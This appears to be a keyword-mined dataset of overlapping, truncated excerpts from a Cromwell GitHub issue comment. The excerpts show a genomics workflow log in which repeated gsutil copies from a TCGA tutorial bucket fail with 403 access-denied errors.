Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12747,access,access,12747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14001,access,access,14001,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2900,access,access,2900,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3136,access,access,3136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4390,access,access,4390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5644,access,access,5644,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6898,access,access,6898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8152,access,access,8152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9406,access,access,9406,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10660,access,access,10660,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11914,access,access,11914,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13168,access,access,13168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_wor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14422,access,access,14422,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 